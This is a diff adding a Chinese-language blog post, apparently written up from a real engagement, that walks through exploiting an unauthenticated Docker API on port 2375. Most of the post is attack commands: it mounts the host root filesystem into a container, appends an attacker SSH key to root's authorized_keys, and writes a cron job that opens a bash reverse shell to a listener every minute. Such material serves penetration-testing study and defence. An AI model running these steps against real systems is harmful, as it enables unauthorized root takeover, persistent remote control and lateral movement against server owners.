@@ -1,0 +1,101 @@
+---
+title: docker未授權致RCE
+date: 2025-02-04T00:00:00.000Z
+tags:
+  - sec
+draft: false
+images:
+  - >-
+    /static/images/blog/2025/docker-unauthorized/Pasted%20image%2020250409140309.png
+authors:
+  - default
+---
+
+- 參考謝公子：[Site Unreachable](https://cloud.tencent.com/developer/article/2321247)
+- 在實戰中遇到了記一下，最終可以直接 ssh 登錄 + 反彈 shell 到內網其他主機
+
+## 測試過程
+
+### docker 未授權
+
+nmap 掃描發現 2375 端口開放 docker 服務，測試以下 URL 發現 docker 未授權：
+
+```
+http://x.x.x.x:2375/version
+http://x.x.x.x:2375/images
+http://x.x.x.x:2375/info
+```
+
+### docker 遠程命令
+
+可以在本地使用命令遠程管理 docker：
+
+```bash
+docker -H tcp://<IP>:2375 images -a
+docker -H tcp://<IP>:2375 ps
+docker -H tcp://<IP>:2375 exec -it e7d97caf249d /bin/bash
+```
+
+### 獲取宿主機權限
+
+容器裡面操作沒啥意義，關鍵是要獲取宿主機（目標服務器）的權限。
+
+啟動一個未開啟的容器，然後將**宿主機的磁盤掛載到容器中**：
+
+```bash
+docker -H tcp://<IP>:2375 run -it -v /:/opt b76f96a98a27 /bin/bash
+```
+
+- `-v /:/opt`：-v 選項的作用是選擇掛載卷，此處將宿主機的整個文件系統 `/` 掛載到容器內的 `/opt` 目錄下。
+
+**因此，我們可以通過容器內 `/opt` 目錄，管理宿主機文件系統。**
+
+### 寫入SSH公鑰
+
+管理文件系統並不算真正獲取權限，但是也快了。
+
+先在本地生成一對 SSH 的公私鑰對，然後直接 echo 把 SSH 公鑰寫入服務器的公鑰文件：
+
+```bash
+# 本地生成公私钥对
+ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
+# 默认保存在 ~/.ssh , 私钥是 id_rsa , 公钥是 id_rsa.pub
+
+# 修改服务器文件：进入docker容器挂的宿主机文件系统
+cd /opt/root/.ssh/
+# echo 写入公钥（id_rsa.pub的内容）
+echo "ssh-rsa jdiofjsdoijfosjdsjfosdjfo..." >> authorized_keys
+```
+
+- 沒有.ssh目錄或者 authorized_keys 文件就自己創建一個
+
+服務器寫入公鑰之後，本地可以直接通過**指定私鑰文件**來登錄服務器：
+
+```bash
+ssh -i ~/.ssh/id_rsa root@<IP>
+```
+
+### 持久化
+
+最後做一步權限維持，給宿主機設置**定時任務**。
+
+將反彈 shell 的命令寫入 `/var/spool/cron/root` 文件中：
+
+- 也可能是 `/var/spool/cron/crontab/root`
+
+```bash
+cd /opt/var/spool/cron
+echo "*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/<IPonListening>/4444 0>&1" >> root
+```
+
+- 含義是每隔一分鐘，反彈一次 shell
+
+假如服務器默認 shell 是 zsh，需要把反彈 shell 命令改成：
+
+```bash
+echo "*/1  *  *  *  *   bash -c 'bash -i >& /dev/tcp/<IPonListening>/10341 0>&1'" >> root
+```
+
+注意，目標服務器可能出不了網，只能反彈 shell 到內網，需要有一臺內網機器，可以之後再由內網機器配置轉發到外網。
+
+![](/static/images/blog/2025/docker-unauthorized/Pasted%20image%2020250409140309.png)
